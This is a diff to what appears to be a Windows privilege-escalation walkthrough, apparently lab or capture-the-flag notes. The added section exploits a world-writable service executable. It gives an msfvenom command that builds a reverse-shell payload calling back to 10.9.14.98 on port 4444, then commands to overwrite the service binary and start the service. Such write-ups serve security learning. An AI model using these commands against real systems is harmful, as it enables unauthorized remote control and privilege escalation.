@@ -62,6 +62,18 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
            Transfer the accesschk.exe to pc and check for weak executable service
            
 ![Service(Executable)](https://user-images.githubusercontent.com/55708909/92559368-1a600680-f28e-11ea-940d-2472ece84622.png)
+ 
+            We notice that everyone has read and write access to filepermservice.exe
+            
+            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f exe > filepermservice.exe
+            
+            transfer filepermservice.exe to target system
+            
+            copy /y filepermservice.exe "C:\Program Files\File Permissions Service"
+
+            sc start filepermsvc 
+            
+![Service(Executable_1)](https://user-images.githubusercontent.com/55708909/92560004-45972580-f28f-11ea-88fd-f5c365dd41ef.png)
 
            
 5- Registry (Always installed elevated):
